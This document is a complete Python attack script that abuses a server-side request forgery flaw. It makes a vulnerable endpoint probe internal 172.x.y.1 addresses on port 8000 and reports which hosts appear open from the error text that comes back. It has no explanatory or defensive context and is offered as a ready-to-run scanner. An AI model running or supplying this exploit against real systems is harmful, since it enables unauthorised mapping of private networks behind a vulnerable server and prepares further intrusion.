#!/usr/bin/env python3
import argparse
import requests

# Constants
PORT = 8000
BASE_IP_FORMAT = "http://172.{second}.{third}.1"

# Argument parsing
parser = argparse.ArgumentParser(description="Scan internal 172.*.*.1 addresses via SSRF.")
parser.add_argument('-t', '--target', help='Host/IP of the SSRF-vulnerable endpoint', required=True)
parser.add_argument('--timeout', help='Request timeout in seconds (default: 3)', type=int, default=3)
parser.add_argument('-v', '--verbose', help='Enable verbose mode', action='store_true')
args = parser.parse_args()

timeout = args.timeout

# Scanning loop
for second in range(16, 256):
    for third in range(1, 256):
        host = BASE_IP_FORMAT.format(second=second, third=third)
        print(f"Trying host: {host}")

        try:
            payload = {"url": f"{host}:{PORT}"}
            response = requests.post(url=args.target, json=payload, timeout=timeout)

            if args.verbose:
                print(f"\t{PORT}\tVERBOSE: {response.text.strip()}")

            body = response.text

            if "status code 404" in body:
                print(f"\t{PORT}\tOPEN - returned 404")
            elif "You don't have permission to access this" in body:
                print(f"\t{PORT}\tOPEN - permission error (valid resource)")
            elif "Parse Error:" in body:
                print(f"\t{PORT}\tPOTENTIALLY OPEN - parse error, possibly non-HTTP")
            elif "socket hang up" in body:
                print(f"\t{PORT}\tOPEN - socket hang up, likely non-HTTP")
            else:
                if args.verbose:
                    print(f"\t{PORT}\tUNKNOWN RESPONSE: {body.strip()[:100]}")

        except requests.exceptions.Timeout:
            print(f"\t{PORT}\tTIMED OUT")
        except requests.exceptions.RequestException as e:
            print(f"\t{PORT}\tERROR: {e}")
